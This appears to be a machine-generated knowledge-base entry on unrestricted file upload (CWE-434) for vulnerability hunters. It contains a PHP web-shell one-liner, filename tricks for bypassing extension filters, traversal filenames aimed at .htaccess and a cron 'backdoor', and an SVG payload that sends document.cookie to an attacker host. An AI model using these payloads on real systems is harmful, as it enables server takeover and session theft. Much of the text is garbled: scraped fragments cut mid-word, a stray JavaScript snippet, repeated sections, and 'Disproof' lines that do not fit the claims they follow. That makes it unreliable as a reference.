# Unrestricted File Upload

## Definition

The server accepts an upload without constraining type, name, location or interpretation.

- **CWE:** 434
- **OWASP:** A04:2021
- **Surface:** web
- **Aliases:** ["file upload", "unrestricted upload", "web shell upload"]

Canonical home for `file_upload`. Rendered from `db/wks.db` by `tools/taxonomy/build_taxonomy.py` — edit the rows, not this file.

## Root Cause

Not yet researched.

## Preconditions

Not yet researched.

## Attack Surface

Surface: **web**.

The entry points and enabling conditions for this surface are enumerated under **Preconditions**; the observable signals are under **Detection**.

## Detection

**A convincing observation for this class is: The winning observation is executable - the response body contains the output of your payload, an error from the interpreter naming the file, or the file is served with an interpreter-mapped content type.**

Derived from file_upload.validation.fetch_stored_object_as_interpreter_would, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (file_upload.validation.fetch_stored_object_as_interpreter_would) states the full boundary.

## Exploitation

**Files are scanned in memory at upload time, allowing applications to make accept or reject decisions early in the request flow.**

Software teams building services in JavaScript are adding more layers of defense to handle untrusted file uploads. An open-source project called Pompelmi aims to insert malware scanning and policy checks directly into Node.js applications before files reach storage or business logic. 
 
 Pompelmi is built for JavaScript and TypeScript environments and runs directly within the application process. Files are scanned in memory at upload time, allowing applications to make accept or reject decisions early in the request flow. 
 Inline scanning in application code 
 At its core, Pompelmi acts as a file scanner that developers can embed into upload handlers. Incoming files are evaluated against a series of checks that can flag content as acceptable, suspicious, or malicious based on configured rules. 
 The scanner operates without external network calls. This design allows scanning decisions to remain within the applica

*Disproof:* Refuted when: the resolved path stays inside the permitted base directory after the platform canonicalises it. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Files are scanned in memory at upload time, allowing applications to make accept”) does not occur under a test that isolates that control.

**The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.**

r example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. 
 This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. 
 Be careful to avoid CWE-243 and other weaknesses related to jails. 
 
 
 
 Effectiveness: Limited 
 
 
 
 Note: 
 The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed. 
 
 
 
 
 
 
 
 
 
 
 

 

 
 
 
 

 
 

 
 
 
 
 

 
 
 

 
 
 

 
 
 

 
 
 

 
 
 

 
 
 

 
 
 

 
 
 
 
 

 
 
 
 
 

 
 
 
 
 

 
 
 
 
 
 Relationships
 
 
 
 
 This table shows the weaknesses and high level categories that are related to this
 weakness. These relationships are defined as ChildOf, ParentOf, MemberOf and give insight to
 similar items that may exist at higher and lower leve

*Disproof:* Refuted when: the resolved path stays inside the permitted base directory after the platform canonicalises it. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“The effectiveness of this mitigation depends on the prevention capabilities of t”) does not occur under a test that isolates that control.

**For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.**

Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. 
 OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. 
 This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. 
 Be careful to avoid CWE-243 and other weaknesses related to jails. 
 
 
 
 Effectiveness: Limited 
 
 
 
 Note: 
 The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and mi

*Disproof:* Refuted when: the resolved path stays inside the permitted base directory after the platform canonicalises it. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“For example, java.io.FilePermission in the Java SecurityManager allows the softw”) does not occur under a test that isolates that control.

**The product allows the upload or transfer of dangerous file types that are automatically processed within its environment.**

ose it 
var modal = document.getElementById("customFilterModal"); 
window.onclick = function(event) { 
 if (event.target == document.getElementById("customFilterModal")) { 
 modal.style.display = "none"; 
 document.getElementById("customFilterLeftBox").innerHTML = ""; 
 document.getElementById("customFilterRightBox").innerHTML = ""; 
 } 
} 
 

 

 
 
 
 
 

 
 
 
 
 
 
 
 Description
 
 
 
 
 
 
 The product allows the upload or transfer of dangerous file types that are automatically processed within its environment. 
 
 
 
 
 
 
 
 
 
 
 

 

 

 
 
 
 
 
 
 
 Alternate Terms
 
 
 
 
 
 
 
 
 
 
 Unrestricted File Upload
 
 
 Used in vulnerability databases and elsewhere, but it is insufficiently precise. The phrase could be interpreted as the lack of restrictions on the size or number of uploaded files, which is a resource consumption issue. 
 
 
 
 
 
 
 
 
 
 

 

 
 
 
 
 Common Consequences 
 
 
 This t

*Disproof:* Refuted when: the resolved path stays inside the permitted base directory after the platform canonicalises it. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“The product allows the upload or transfer of dangerous file types that are autom”) does not occur under a test that isolates that control.

**Files are scanned in memory at upload time, allowing applications to make accept or reject decisions early in the request flow.**

Software teams building services in JavaScript are adding more layers of defense to handle untrusted file uploads. An open-source project called Pompelmi aims to insert malware scanning and policy checks directly into Node.js applications before files reach storage or business logic. 
 
 Pompelmi is built for JavaScript and TypeScript environments and runs directly within the application process. Files are scanned in memory at upload time, allowing applications to make accept or reject decisions early in the request flow. 
 Inline scanning in application code 
 At its core, Pompelmi acts as a file scanner that developers can embed into upload handlers. Incoming files are evaluated against a series of checks that can flag content as acceptable, suspicious, or malicious based on configured rules. 
 The scanner operates without external network calls. This design allows scanning decisions to remain within the applica

*Disproof:* Refuted when: the resolved path stays inside the permitted base directory after the platform canonicalises it. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Files are scanned in memory at upload time, allowing applications to make accept”) does not occur under a test that isolates that control.

**This can give attackers enough room to bypass the intended validation.**

ness rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue." 
 Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. 
 For example, limiting filenames to alphanumeric characters can help to restrict the introduction of unintended file extensions. 
 
 
 
 
 
 
 
 
 
 
 Architecture and Design 
 
 
 
 
 
 Define a very limited set of allowable extensions and only gen

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "This can give attackers enough room to bypass the intended validation.".

**This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.**

rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations. 
 
 
 
 
 
 
 
 
 
 Architecture and Design; Operation 
 
 
 
 
 
 
 Strategy: Sandbox or Jail 
 
 
 
 Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. 
 OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. 
 This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject t

*Disproof:* Refuted when: the value is bound as a parameter or written through the framework's own encoder, so the interpreter never sees attacker text as syntax. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“This may effectively restrict which files can be accessed in a particular direct”) does not occur under a test that isolates that control.

**That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment.**

ME content type and ensuring that it matches the extension is only a partial solution. 
 
 
 
 
 
 
 
 
 
 Architecture and Design; Operation 
 
 
 
 
 
 
 Strategy: Environment Hardening 
 
 
 Run your code using the lowest privileges that are required to accomplish the necessary tasks [ REF-76 ]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations. 
 
 
 
 
 
 
 
 
 
 Architecture and Design; Operation 
 
 
 
 
 
 
 Strategy: Sandbox or Jail 
 
 
 
 Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which file

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "That way, a successful attack will not immediately give the attacker access to the rest of".

**An upload endpoint that stores an attacker-supplied .php under a temporary name is only exploitable when a second primitive reaches it; the same request pair also shows why declared MIME must be compared against the detected file signature.**

The technique is a two-step chain, and reporting only the first step overstates it. In a documented case, a unrestricted php file upload vulnerability exists in a temporary copy functionality where a specially crafted HTTP request can lead to arbitrary code execution when chained with an LFI vulnerability, requiring a series of HTTP requests. That series is the tell: the upload itself lands an inert temporary copy, and the execution comes from a local file inclusion that includes it by path. That is why an upload-scanner hit on 'unrestricted extension accepted' is not self-sufficient evidence of RCE, and why the second primitive must be named. The same endpoint teaches the cheap defensive control. A scanner that compares declared content types with detected file signatures reduces reliance on user-provided metadata, and inspectors that examine archive contents before extraction, with limits on recursion depth, total file counts, and archive size expansion, are aimed at archive bombs and nested payload delivery. Hunt accordingly: upload a polyglot whose declared type and detected signature disagree, note whether the server keeps the declared type, then attempt to include the stored temporary path and compare the response against a control request for a path that was never uploaded.

*Disproof:* The uploaded temporary file can be included and executed without any further condition, showing the upload endpoint alone yields code execution and no second primitive is required.

**A multipart filename field containing parent-directory segments escapes the upload directory when the server concatenates the client filename onto a base path.**

The filename is a second input channel inside the upload request body, separate from the file content, and it is routinely concatenated without validation. Craft the part's filename with leading parent segments and a distinctive extension-free name, then check whether the artefact appears outside the intended directory. Establish which account performs the write, because the writable set is bounded by that account's permissions and determines whether a web directory or a config directory is reachable. Use an inert filename; the goal is to prove the path escape, not to plant anything executable.

*Disproof:* If the server strips parent segments from the filename, generates its own name, or resolves the write strictly inside the canonicalised upload directory, the traversal is not present.

**Uploading a file whose extension passes a naive extension check but whose content is executable (or is given executable handling) yields remote code execution through the web server.**

In practice on HTB this shows up as: ### Module Summary
Many modern web applications have file upload capabilities, which are usually necessary for the web application's functionality to enable features like attaching files or changing a user's profile image. If the file upload functionality is not securely coded, it may be abused to upload arbitrary files to the back-end server, eventually leading to compromise of the back-end server.
When an attacker can upload arbitrary files to the back-end server, they can upload malicious files, like web shells, which would enable them to execute arbitrary commands on the back-end server. This eventually allows attackers to take control over the entire server and all web applications hosted on it, which makes `File Upload Attacks` among the most critical web vulnerabilities.

Write-up provenance: Esther7171/HackTheBox-Writeups-Walkthroughs :: Write-ups/Academy/05. Web Exploitation/31c. File Upload Attacks/File Upload Attacks.md (816 words, classified web).

*Disproof:* Refuted when the upload is stored outside any served or executable path, or the content is rewritten to an inert type, so no interpreter ever executes the uploaded bytes.

## Variations

**An extension or MIME allowlist is defeated when the attacker controls the stored filename the application later uses in a server-side include, an archive extraction, or an image re-encode step, because the check ran on one representation while the interpreter acts on another.**

Mechanism: An extension or MIME allowlist is defeated when the attacker controls the stored filename the application later uses in a server-side include, an archive extraction, or an image re-encode step, because the check ran on one representation while the interpreter acts on another. How to apply it in the field: treat this as the bypass it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It is not a bypass when the stored name is generated server-side from the content rather than from the request, so the attacker never chooses the suffix the interpreter sees; it is a bypass when a request-controlled name or a container-within-container survives into the path that a parser acts on.

*Disproof:* It is not a bypass when the stored name is generated server-side from the content rather than from the request, so the attacker never chooses the suffix the interpreter sees; it is a bypass when a request-controlled name or a container-within-container survives into the path that a parser acts on.

**The application blocks dangerous extensions with a blacklist, but the check is bypassable via parsing discrepancies: null-byte truncation (.php%00.jpg), double extensions (.php.jpg), case manipulation (.pHp), trailing characters (.php.), URL-encoded dots (%2Ephp), semicolons before the extension (.asp;.jpg), multibyte unicode dots, and non-recursive stripping of the prohibited string (exploit.p.phphp).**

1) Probe which extensions are blocked; expect .php to be refused. 2) Send filename.php%00.jpg - the check sees .jpg but the underlying engine (legacy PHP < 5.3.4, C/C++ string handling) truncates at the null byte, leaving the real .php extension. 3) Send filename.php.jpg: the filter matches the final segment while the execution rule maps the first/other segment. 4) Send filename%2Ephp - if validation happens on the raw (encoded) name but the server decodes before mapping the extension, the encoded dot defeats the check. 5) Send filename.p.phphp - a non-recursive strip removes the inner .php but leaves .phphp as the executed extension (zetsu.ninja documents each of these). OWASP documents: double extensions, null bytes, case manipulation, alternative extensions (.phtml/.php5), NTFS ADS (shell.asp:.jpg), and generic bad regex as the canonical bypass set.

*Disproof:* If extension resolution happens after full percent-decoding and Unicode normalization on both sides (no decoding discrepancy), if null-byte handling is identical across validation and execution, if the filter applies the blacklisting recursively (p.phphp -> phphp -> stripped), and if both sides treat extension names case-sensitively, the payload is inert.

**The application validates only the leading magic bytes of the uploaded file (a fixed prefix such as GIF89a or FF D8 FF E0) and fails to verify the complete signature or the remainder of the content; an attacker uploads a polyglot whose header is a valid image signature followed by the malicious script appended after the signature, so the partial check passes and the file is executed as code.**

1) Generate a file whose first bytes match the target image signature (GIF89a 'GIF89a1234' or JPEG 'GIF89a'/'FF D8 FF E0') with the webshell script appended in the body. 2) Upload it through the filter; the signature check passes because the prefix matches. 3) The server stores the file under a whitelisted extension. 4) When the file is requested, the server's interpreter (PHP) processes the whole file, including the appended payload, because PHP does not stop at the image header. OWASP explicitly warns that file-signature validation 'should not be used on its own, as bypassing it is pretty common and easy', and PortSwigger notes the possibility of hybrid files containing both executable and non-executable content to bypass content filters (GIFAR-style).

*Disproof:* If the file is decoded and re-encoded (ImageMagick convert, etc.) before execution - which discards the appended payload - or if the check requires a full/multi-byte signature match plus content-type agreement, or if the stored file is never served as an executable (served as text/plain / attachment), the appended script never runs.

**The application validates an uploaded file only against the input-specific Content-Type header, which the client controls and which the server implicitly trusts; an attacker sets Content-Type: image/jpeg while the body is a PHP webshell, the server accepts the file, stores it, and serves/executes it as a web shell.**

1) Submit a multipart POST to the upload endpoint with Content-Type: image/jpeg and a PHP one-liner payload (e.g., <?php echo system($_GET['cmd']); ?>). 2) The server's allowlist check passes because the header is trusted. 3) Retrieve the file at /files/avatars/<file> and observe the script output in the response - arbitrary command execution. 4) PortSwigger's lab solution for 'Web shell upload via Content-Type restriction bypass' is exactly this: change the Content-Type to image/jpeg and the uploaded .php avatar is executed. The HTTP Content-Type header is sent by the browser/client and is trivially spoofable (RFC 1945/2616); nothing forces it to match the file's real bytes, so a client-trusted check alone is meaningless.

*Disproof:* If the server re-derives the MIME type from the file's magic bytes (not the header), or re-encodes/decodes the file before storage, the spoofed header is ignored and the payload is blocked; if the upload directory is not executable (scripts served as text/plain) or is outside the webroot, the stored webshell is inert.

## Technology / Framework Considerations

Not yet researched.

## API Considerations

Not yet researched.

## Attack Chains

- `upload-traversal-to-interpreter-execution` — Upload filename traversal to interpreter-reachable code execution (goal: `remote_code_execution`)

## Real-World Examples

Not yet researched.

## Common False Positives

**Trusting the MIME value supplied with the upload request as proof of file type is a false negative, because that value is chosen by the client and can be set to anything regardless of the actual bytes.**

Mechanism: Trusting the MIME value supplied with the upload request as proof of file type is a false negative, because that value is chosen by the client and can be set to anything regardless of the actual bytes. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It IS adequate when the type is determined from the file content by the server rather than taken from the request; it is NOT adequate when the decision reads the client-declared value, since the attacker controls that field directly and the same request can be replayed with any declared type.

*Disproof:* It IS adequate when the type is determined from the file content by the server rather than taken from the request; it is NOT adequate when the decision reads the client-declared value, since the attacker controls that field directly and the same request can be replayed with any declared type.

**The mere presence of an upload endpoint that accepts and stores a file is not a finding; what makes it reportable is a missing control on one specific dimension, such as execution on retrieval, unlimited size, or attacker-chosen storage name.**

Mechanism: The mere presence of an upload endpoint that accepts and stores a file is not a finding; what makes it reportable is a missing control on one specific dimension, such as execution on retrieval, unlimited size, or attacker-chosen storage name. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It IS reportable when any of those dimensions is missing and demonstrated; it is NOT a finding when the upload is size-limited, stored under a server-generated name outside the web root, and never passed to an interpreter, since a stored file with no reachable handler is expected application behaviour.

*Disproof:* It IS reportable when any of those dimensions is missing and demonstrated; it is NOT a finding when the upload is size-limited, stored under a server-generated name outside the web root, and never passed to an interpreter, since a stored file with no reachable handler is expected application behaviour.

**Uploading a file with an executable extension is only remote code execution when the stored file is reachable through the web server and executed in a context the server interprets, so storage outside the document root defeats the finding regardless of the extension.**

Mechanism: Uploading a file with an executable extension is only remote code execution when the stored file is reachable through the web server and executed in a context the server interprets, so storage outside the document root defeats the finding regardless of the extension. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It IS RCE when the stored file sits under a served path and a request to it returns the body with an execution-interpreted content type, or when an include or deserialisation step reaches it; it is NOT RCE when retrieval requires a filesystem path the web server does not expose, which is exactly the case a report must prove rather than assume.

*Disproof:* It IS RCE when the stored file sits under a served path and a request to it returns the body with an execution-interpreted content type, or when an include or deserialisation step reaches it; it is NOT RCE when retrieval requires a filesystem path the web server does not expose, which is exactly the case a report must prove rather than assume.

**When the server appends its own timestamp or extension, the uploaded file cannot execute code; report arbitrary file write, not RCE.**

Check whether the final on-disk name is attacker-controlled in its extension before claiming execution. If the server appends a timestamp or normalises the extension, a dropped web-shell name never gets that name, so the finding caps at arbitrary file write with the server account's privileges. Escalate to code execution only when the writable set demonstrably includes a file the server itself parses or executes, such as init scripts or the server executable itself. State the privilege bound in the write-up, since a write as an unprivileged service account is a materially different severity than a write into the web root.

*Disproof:* If a probe file with a server-appended name and extension lands in a web-served directory and is rendered or executed, the extension IS controllable and the RCE claim holds.

**An upload endpoint that accepts an arbitrary file but stores it outside the webroot behind a download handler is not an unrestricted file upload vulnerability, because the missing control is interpreter reachability rather than acceptance of the type.**

The lookalike: you POST a .php or .jsp file, the server returns 200 and stores your bytes, and it is filed as unrestricted file upload. CWE-434 states the precondition precisely: arbitrary code execution is possible if an uploaded file is interpreted and executed as code by the recipient. If your upload lands outside the document root and is only ever served back through an application handler that maps an opaque identifier to the stored object, the interpreter never sees it and the precondition is absent. OWASP's guidance is explicit that files should be stored outside the webroot where only administrative access is allowed, and that where public access to the files is needed a handler should be used. The winning test is to resolve the stored object the way a web server would - request the directory the file was written into, request the stored filename directly, and check whether any interpreter-mapped extension reaches it. Only if a direct fetch executes, or a handler emits an executable content type, is the acceptance the vulnerability.

*Disproof:* Refuted when a direct request to the stored path returns 404 or the raw bytes with a non-executable content type, and the only retrieval path is an application handler that serves the object without invoking an interpreter; CWE-434's execution precondition is then unmet regardless of which extension was accepted.
**Hypothesis:** An upload endpoint that accepts a .php file and returns 200 is an unrestricted file upload vulnerability.
- Invalidated by: The direct path returned 404 and the handler served the bytes as application/octet-stream from outside the document root; the object is stored outside the webroot behind an application handler and no interpreter ever evaluates it, so CWE-434's execution precondition is unmet.
- **Rejection rule:** Acceptance is not execution. Confirm unrestricted file upload by retrieving the stored object at a path an interpreter claims and observing it parsed or executed; storage outside the webroot behind an application handler satisfies OWASP guidance even when the extension is accepted.

## Validation

**An unrestricted file upload is confirmed only when the stored object is retrievable at a path an interpreter claims, demonstrated by executing or parsing it as code rather than by observing a successful upload response.**

The upload response proves nothing on its own - it confirms the endpoint accepted bytes. Take the stored artifact and go get it back the way the web server would. Step one, resolve the storage path: use the response's returned identifier, filename, or path hint to construct a direct request to the stored object, including traversal forms if the filename was attacker-controlled. Step two, classify the response: note the status, the Content-Type, and whether the body comes back as raw bytes or as interpreted output. The winning observation is executable - the response body contains the output of your payload, an error from the interpreter naming the file, or the file is served with an interpreter-mapped content type. That is the CWE-434 precondition satisfied, and it is especially true for extensions such as .asp and .php because those file types are often treated as automatically executable even when file system permissions do not specify execution. Refuted outcome: 404 on the direct path, a download served as application/octet-stream through an application handler, or the raw bytes echoed uninterpreted. Also verify the type check itself - the Content-Type for uploaded files is provided by the user and cannot be trusted, so a mismatch between declared type and file signature is a lead, not proof.

*Disproof:* Refuted when a direct request to the stored path returns 404 or the uninterpreted bytes with a non-executable content type and no interpreter ever evaluates the object; a successful upload response without interpreter-confirmed retrieval is acceptance, not execution.

**The convincing upload evidence is a request/response pair showing the uploaded content served back over HTTP from the stored location, which is what distinguishes a stored upload from a file that merely landed on disk.**

Mechanism: The convincing upload evidence is a request/response pair showing the uploaded content served back over HTTP from the stored location, which is what distinguishes a stored upload from a file that merely landed on disk. How to apply it in the field: treat this as the validation it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: If no HTTP GET returns the stored bytes, the upload may still be a real defect when the content is later parsed as an archive, deserialised, or served from a different application sharing the disk; but when the file is never served and never opened by a parser, the absence of retrieval evidence means the report must state an unproven execution path rather than claiming RCE.

*Disproof:* If no HTTP GET returns the stored bytes, the upload may still be a real defect when the content is later parsed as an archive, deserialised, or served from a different application sharing the disk; but when the file is never served and never opened by a parser, the absence of retrieval evidence means the report must state an unproven execution path rather than claiming RCE.

**To decide this case, observe: How to apply it in the field: treat this as the bypass it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from file_upload.bypass.an_extension_allowlist_is_defeated_by_server_side_parsing_of_the_upload, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (file_upload.bypass.an_extension_allowlist_is_defeated_by_server_side_parsing_of_the_upload) states the full boundary.

**To decide this case, observe: Step two, classify the response: note the status, the Content-Type, and whether the body comes back as raw bytes or as interpreted output.**

Derived from file_upload.validation.fetch_stored_object_as_interpreter_would, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (file_upload.validation.fetch_stored_object_as_interpreter_would) states the full boundary.

**To decide this case, observe: Mechanism: The convincing upload evidence is a request/response pair showing the uploaded content served back over HTTP from the stored location, which is what distinguishes a stored upload from a file that merely landed on disk.**

Derived from file_upload.validation.prove_retrieval_of_the_stored_file_over_http, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (file_upload.validation.prove_retrieval_of_the_stored_file_over_http) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from file_upload.fp_rule.accepting_an_upload_and_storing_it_is_not_itself_a_vulnerability, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (file_upload.fp_rule.accepting_an_upload_and_storing_it_is_not_itself_a_vulnerability) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from file_upload.fp_rule.a_client_supplied_content_type_header_is_not_type_validation, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (file_upload.fp_rule.a_client_supplied_content_type_header_is_not_type_validation) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from file_upload.fp_rule.an_uploaded_file_kept_outside_the_webroot_is_not_remote_code_execution, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (file_upload.fp_rule.an_uploaded_file_kept_outside_the_webroot_is_not_remote_code_execution) states the full boundary.

**To decide this case, observe: If the server appends a timestamp or normalises the extension, a dropped web-shell name never gets that name, so the finding caps at arbitrary file write with the server account's privileges.**

Derived from file_upload.fp_rule.extension_not_controlled, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (file_upload.fp_rule.extension_not_controlled) states the full boundary.

## Impact

**End-user upload capability is a high-value target on its own, because a single accepted file can host a phishing page on the site's own origin or expose internal web server data.**

End-user upload capability is a high-value target on its own, because a single accepted file can host a phishing page on the site's own origin or expose internal web server data.

HackTricks reference: file upload (https://kathan19.gitbook.io/howtohunt/file-upload-bypass/file_upload.md)

*Disproof:* Uploads are quarantined in a non-public, non-executable location and no uploaded content is served from the site's origin or reveals server-side data.

**Because a bypassed upload check can land a file whose contents the server then executes, an upload bypass finding is only complete once the stored file is shown executing on the server.**

Because a bypassed upload check can land a file whose contents the server then executes, an upload bypass finding is only complete once the stored file is shown executing on the server.

HackTricks reference: file upload (https://kathan19.gitbook.io/howtohunt/file-upload-bypass/file_upload.md)

*Disproof:* The accepted file is renamed, stored outside any executable path and served back as inert content with no execution on the server.

**End-user upload capability is a high-value target on its own, because a single accepted file can host a phishing page on the site's own origin or expose internal web server data.**

End-user upload capability is a high-value target on its own, because a single accepted file can host a phishing page on the site's own origin or expose internal web server data.

HackTricks reference: file upload (https://kathan19.gitbook.io/howtohunt/file-upload-bypass/file_upload.md)

*Disproof:* Uploads are quarantined in a non-public, non-executable location and no uploaded content is served from the site's origin or reveals server-side data.

**Because a bypassed upload check can land a file whose contents the server then executes, an upload bypass finding is only complete once the stored file is shown executing on the server.**

Because a bypassed upload check can land a file whose contents the server then executes, an upload bypass finding is only complete once the stored file is shown executing on the server.

HackTricks reference: file upload (https://kathan19.gitbook.io/howtohunt/file-upload-bypass/file_upload.md)

*Disproof:* The accepted file is renamed, stored outside any executable path and served back as inert content with no execution on the server.

**The application trusts the client-supplied filename field and does not validate the save path; an attacker uses '../' sequences in the filename (CWE-23 relative path traversal) to write outside the intended upload directory - overwriting an existing, high-value file such as .htaccess, a web server config, a library the application loads, or a script in the webroot - thereby changing server behavior or achieving code execution from a previously innocuous file.**

1) Inspect the upload request for the filename parameter: filename=\"../../../.htaccess\" or \"....//....//....//etc/cron.d/backdoor\". 2) The application writes the file at the computed path, and the traversal escapes the upload sandbox (CWE-434's observed example: 'the creation of the BufferedWriter object is subject to relative path traversal (CWE-23)... an attacker can use \"../\" sequences to write to files outside of the intended directory'). 3) Overwriting .htaccess changes how the directory is executed (mapping a whitelisted extension to PHP); overwriting a loaded library or a webroot script gives code execution; overwriting a cron entry or system file gives persistence/denial. CWE-434 lists this as a consequence: code execution, XSS (CWE-79), or system crash.

*Disproof:* If the filename is sanitized server-side (basename extraction, UUID rename, path construction with a fixed upload root), if the save is jailed in a chroot or directory sandbox, or if the OS sandbox (open_basedir, container seccomp, permissions) prevents writes outside the target directory, the traversal is blocked.

**The application accepts and publicly serves an uploaded SVG image that contains inline scriptable content (e.g., <script>alert(1)</script>, <image xlink:href=\"javascript:alert(1)\">, <iframe srcdoc>, or a data URI); because the file is served from the same origin as the upload endpoint, any user who renders the SVG executes the script in the application's origin - stored XSS with session theft, CSRF, or defacement as the impact.**

1) Upload an SVG containing <svg onload=alert(document.cookie)> or <script>fetch('//attacker/?c='+document.cookie)</script> with Content-Type image/svg+xml. 2) The server stores it and serves it via a public URL on the same origin. 3) A victim requests the URL; the browser parses image/svg+xml as SVG (which is HTML-parsing based) and executes the inline script in the origin of the upload endpoint (PortSwigger: the same-origin restriction means the attack only works when the uploaded file is served from the same origin). zetsu.ninja: 'if you can upload HTML files or SVG images, you can potentially use <script> tags to create stored XSS payloads.' PortSwigger: 'if you can upload HTML files or SVG images, you can potentially use <script> tags to create stored XSS payloads. If the uploaded file then appears on a page that is visited by other users, their browser will execute the script when it tries to render the page. Note that due to same-origin policy restrictions, these kinds of attacks will only work if the uploaded file is served from the same origin to which you upload it.'

*Disproof:* If the upload endpoint strips/escapes <script> and event handlers, or stores only sanitized SVG (no script-capable elements), or if the file is served with Content-Disposition: attachment / X-Content-Type-Options: nosniff (preventing MIME sniffing and script execution), or if it is hosted on a separate origin (e.g., a CDN on a different domain), the script never executes.

